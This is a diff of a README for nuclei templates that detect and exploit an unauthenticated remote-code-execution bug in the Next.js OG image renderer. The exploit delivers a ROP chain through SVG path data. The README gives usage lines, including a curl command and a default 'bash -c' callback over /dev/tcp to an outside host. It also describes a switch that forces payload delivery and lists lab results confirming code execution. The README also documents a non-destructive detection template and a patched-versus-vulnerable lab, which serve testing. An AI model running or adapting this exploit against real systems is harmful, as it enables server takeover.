@@ -9,22 +9,26 @@ non-PIE and ships fixed gadget addresses, a ROP chain assembled from qwords smug
 through SVG path coordinates reaches `execve("/bin/sh", "-c", cmd)` — unauthenticated RCE,
 no leak required.
 
-| Template | Purpose | Impact on target |
+| File | Purpose | Impact on target |
 | --- | --- | --- |
 | `CVE-2026-94545.yaml` | Reachability check: confirms the native XInclude path is live | none (non-destructive) |
 | `CVE-2026-94545-rce.yaml` | Full exploit: builds and delivers the ROP payload, confirms out of band | executes `cmd` (worker process is replaced) |
+| `lab/` | Reproducible localhost target: vulnerable build, patched twin, OOB listener, offline harness | — |
 
-Both use the **JavaScript protocol** (nuclei v3): the payload is a computed binary
+Both templates use the **JavaScript protocol** (nuclei v3): the payload is a computed binary
 (IEEE-754 double encoding, ~1.2 KB SVG path), which is not expressible with static HTTP
-requests. The JS builder inside the template is byte-identical to the reference builder
+requests. The JS builder inside the RCE template is byte-identical to the reference builder
 shipped with the advisory.
 
 ## Affected / not affected
 
-- Vulnerable: Next.js 16.2.0 – 16.3.5, Satori `>= 0.0.27 < 0.33.5`, Node.js runtime,
-  `sharp` installed in the deployment (native ImageResponse pipeline).
-- Patched: Next.js 16.3.6 / Satori 0.33.5 (Satori escapes the text again).
-- Not exploitable: Edge runtime, or Node runtime without `sharp` (falls back to the
+- Vulnerable: Next.js 16.2.0 – 16.3.5 on the Node.js runtime with `sharp` installed
+  (Satori `>= 0.0.27 < 0.33.5`). Next 16.3.5 ships an OG renderer, built from
+  `@vercel/og@0.11.1`, that passes text through un-escaped.
+- Patched: Next.js 16.3.6 — same wrapper version, but its bundled renderer routes text
+  through `escape-html`, so injected markup never reaches libxml2. Satori 0.33.5 upstream
+  carries the equivalent fix.
+- Not exploitable: Edge runtime, or a Node runtime without `sharp` (falls back to the
   sandboxed `resvg-wasm` renderer, which does not process XInclude).
 
 ## Usage
@@ -48,13 +52,12 @@ nuclei -u https://target.example -t CVE-2026-94545-rce.yaml -var cmd='curl http:
 | `ogpath` | both | `/api/og` | Path of the OG image route. Detection probes `POST <ogpath>` and `GET <ogpath>?value=` / `?text=` / `?title=`. |
 | `safecheck` | rce | `true` | Pre-condition gate: sends the benign probe/control pair and aborts if the native path is absent. Set `-var safecheck=false` to force delivery. |
 | `cmd` | rce | *(empty)* | Command to execute. Interactsh `bash -c 'id>/dev/tcp/<host>/80'` is used when empty. Hard limit of **71 bytes** (the ROP chain has to fit the overflow). |
-| `oast` | rce | `{{interactsh-url}}` | Callback host, optionally `host:port` (port defaults to 80). Filled by Interactsh; can be set explicitly for lab/live-fire testing. |
+| `oast` | rce | `{{interactsh-url}}` | Callback host, optionally `host:port` (port defaults to 80). Filled by Interactsh; set it explicitly for lab or live-fire testing. |
 
 The JavaScript protocol does not expose `BaseURL`, so the base is built from `{{Hostname}}`
 (`host[:port]`) and the scheme is resolved by probing — `http://` first, then `https://`,
-and only one candidate is used when the base already carries a scheme or a port that
-identifies it (`80`, `443`). A target that cannot answer a benign request on a candidate is
-skipped.
+and only one candidate when the base already carries a scheme or a port that identifies it
+(`80`, `443`). A candidate that cannot answer a benign request is skipped.
 
 ## How the detection template decides
 
@@ -66,7 +69,7 @@ It injects the same `xi:include`/`data:` construct twice, byte-for-byte the same
   XML and nothing is drawn (≈ 22 KB PNG).
 
 A target is reported when `probe >= 200 KB`, `control < 200 KB` and `ratio >= 6` for at
-least one request shape. Patched Satori escapes the text, and `resvg-wasm` ignores XInclude,
+least one request shape. Patched builds escape the text, and `resvg-wasm` ignores XInclude,
 so both payloads render identically there and nothing is reported. The check never sends
 the ROP payload, so it leaves a vulnerable target running.
 
@@ -86,22 +89,28 @@ request is distinguishable from an unreachable target.
 
 ## Verification
 
-- Both templates: YAML parses, `yaml=ok schema=ok` against the nuclei JSON schema
-  (`nuclei-jsonschema.json`), and every JS block passes `node --check`.
-- Live lab, same Node.js `v24.20.0` linux-x64 build as the advisory:
+Everything below was produced by `lab/run-tests.sh` against real builds, using the offline
+harness in `lab/tools` (this sandbox cannot run the nuclei binary — see "Testing with real
+nuclei" in `lab/README.md` for the same checks with the real tool).
 
 | Check | Result |
 | --- | --- |
-| `CVE-2026-94545.yaml` → Next.js 16.3.5 | `NEXTJS_OG_XINCLUDE_REACHABLE POST /api/og probe=2522895B control=21979B ratio=114.8` |
-| `CVE-2026-94545.yaml` → Next.js 16.3.6 | `NEXTJS_OG_XINCLUDE_ABSENT` (probe 22,954 B, ratio ≈ 1) |
-| `CVE-2026-94545.yaml` → host:port with nothing listening | `NEXTJS_OG_XINCLUDE_ABSENT`, no error |
-| `CVE-2026-94545-rce.yaml` → Next.js 16.3.6, `safecheck` default | pre-condition false, payload never sent, target stays up |
-| `CVE-2026-94545-rce.yaml` → Next.js 16.3.6, `safecheck=false` | payload delivered, HTTP 200, target stays up |
-| `CVE-2026-94545-rce.yaml` → Next.js 16.3.5 | gate passes, 25,286-byte payload delivered (sha256 `cb55800f435d6522c82d73f0fa1b66c2dde2620617e29594a7787210c702401c`), request aborted, callback received `uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)` |
-| `CVE-2026-94545-rce.yaml` with a 72-byte command | refused with an explicit error, no request sent |
+| Stack under test | Next.js 16.3.5 / 16.3.6, Node v24.20.0 (non-PIE), libvips 8.18.6, librsvg 2.62.91, libxml2 2.15.3, sharp 0.35.4 |
+| `CVE-2026-94545.yaml` → vulnerable 16.3.5 | **matched**: `probe=2522895B control=21979B ratio=114.8` |
+| `CVE-2026-94545.yaml` → patched 16.3.6 | not matched (probe 22,954 B, ratio ≈ 1) |
+| `CVE-2026-94545.yaml` → `-var base=http://127.0.0.1:3000` | matched (override path works) |
+| `CVE-2026-94545.yaml` → closed port | not matched, no error |
+| `CVE-2026-94545-rce.yaml` → patched 16.3.6, gate on | pre-condition false, payload never sent, target stays up |
+| `CVE-2026-94545-rce.yaml` → patched 16.3.6, `safecheck=false` | payload delivered (HTTP 200), target survives, no callback |
+| `CVE-2026-94545-rce.yaml` → vulnerable 16.3.5 | gate passes, 25,286-byte payload delivered (sha256 `cb55800f435d6522c82d73f0fa1b66c2dde2620617e29594a7787210c702401c`), request aborted, callback received `uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)`, worker replaced |
+| 72-byte command | refused with the 71-byte limit message, no request sent |
+| Everything after a restart | target serves again, detection matches again |
+| **Suite total** | **26 passed, 0 failed** |
 
-The delivered payload hash equals the reference builder output for the same command, so the
-in-template JS build path is byte-exact.
+Structural checks (`lab/tools/validate.mjs`): YAML parses, both templates validate against
+`nuclei-jsonschema.json` (vendored from the nuclei repository), and every JS block passes a
+syntax check. No `nuclei -validate` run was possible in this environment (no Go toolchain,
+release downloads blocked) — that is the one gap to close on a machine that has nuclei.
 
 ## Notes
 
